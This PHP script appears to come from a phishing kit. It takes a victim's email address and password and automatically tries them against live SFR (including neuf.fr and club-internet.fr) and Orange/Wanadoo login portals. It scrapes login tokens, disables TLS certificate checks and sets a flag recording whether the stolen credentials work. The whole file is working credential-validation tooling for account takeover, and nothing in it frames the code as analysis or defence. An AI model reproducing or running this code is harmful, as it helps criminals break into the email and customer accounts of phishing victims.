<?php
error_reporting(0);
$user1=$email;
$pass1=$pwd;
$emailx=str_replace("@","%40",$email);
$email1x=strtolower($emailx);
$email2x=strtolower($email);
$domain = strstr($email2x, '@');
$cookie = $ip . ".txt";

$agent = $_SERVER['HTTP_USER_AGENT'];
function doRequest($method, $url, $referer, $agent, $cookie, $vars) {
    $ch=curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if($referer != "") {
	curl_setopt($ch, CURLOPT_REFERER, $referer);
    }
    curl_setopt($ch, CURLOPT_USERAGENT, $agent);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    if ($method == 'POST') {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
    }
    if (substr($url, 0, 5) == "https") {
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
    }
    $str = curl_exec($ch);
    curl_close($ch);
    if ($str) {
        return $str;
    } else {
        return curl_error($ch);
    }
}

function get($url, $referer, $agent, $cookie) {
    return doRequest('GET', $url, $referer, $agent, $cookie, 'NULL');
}

function post($url, $referer, $agent, $cookie,  $vars) {
    return doRequest('POST', $url, $referer, $agent, $cookie, $vars);
}

    if ((strpos($user1, "@sfr.fr") != false) || (strpos($user1, "@neuf.fr") != false) || (strpos($user1, "@online.fr") != false) || (strpos($user1, "@9online.fr") != false) || (strpos($user1, "@club-internet.fr") != false) || (strpos($user1, "@cegetel.net") != false) || (strpos($user1, "@SFR.FR") != false) || (strpos($user1, "@NEUF.FR") != false) || (strpos($user1, "@CLUB-INTERNET.FR") != false) || (strpos($user1, "@CEGETEL.NET"))) {	$url='http://www.sfr.fr/mon-espace-client/?sfrintid=P_head_ec#sfrclicid=P_head_ec';
	$str=get($url, '', $agent, $cookie);
	preg_match_all('/name="lt" value="(.*?)" \/>/si',$str,$matchs);
    $lt = $matchs[1][0];
	
	preg_match_all('/name="execution" value="(.*?)" \/>/si',$str,$matchs);
    $ex = $matchs[1][0];

	$reffer='https://www.sfr.fr/cas/login?service=https%3A%2F%2Fwww.sfr.fr%2Faccueil%2Fj_spring_cas_security_check&sfrintid=EC_head_ec';
	$url='https://www.sfr.fr/cas/login';
    $vars='domain=mire-ec&service=https%3A%2F%2Fwww.sfr.fr%2Faccueil%2Fj_spring_cas_security_check#sfrclicid=EC_mire_Me-Connecter&lt='.$lt.'&execution='.$ex.'&_eventId=submit&username='.urlencode($user1).'&password='.urlencode($pass1).'&remember-me=off&identifier=Submit';
    $str=post($url, $reffer, $agent, $cookie, $vars);

    $url='https://www.sfr.fr/mon-espace-client/';
	$str=get($url, '', $agent, $cookie);
	$firsterror="1";
	
      if (strpos($str, "prenom") != false){
	    $firsterror="0";
		}
    }
	if ((strpos($user1, "@orange.fr") != false) || (strpos($user1, "@wanadoo.fr") != false) || (strpos($user1, "@ORANGE.FR") != false) || (strpos($user1, "@WANADOO.FR") != false)) {
	$url='https://id.orange.fr/auth_user/bin/auth_user.cgi?service=communiquer&return_url=https://webmail1m.orange.fr/webmail/fr_FR/index.html';
	$str=get($url, '', $agent, $cookie);
	$reffer='https://id.orange.fr/auth_user/bin/auth_user.cgi?service=communiquer&return_url=https://webmail1m.orange.fr/webmail/fr_FR/index.html';
	$url='https://id.orange.fr/auth_user/bin/auth_user.cgi';
    $vars='co=42&tt=&tp=&rl=https%3A%2F%2Fwebmail1m.orange.fr%2Fwebmail%2Ffr_FR%2Findex.html&sv=communiquer&dp=html&rt=&isconn=0&credential='.urlencode($user1).'&password='.urlencode($pass1).'&memorize_login=&memorize_password=';
    $str=post($url, $reffer, $agent, $cookie, $vars);
	$firsterror="1";
	
      if (strpos($str, "redirect") != false){
	    $firsterror="0";
		}
    }


  if($firsterror=="0"){
   @unlink($cookie);
  }

?>
 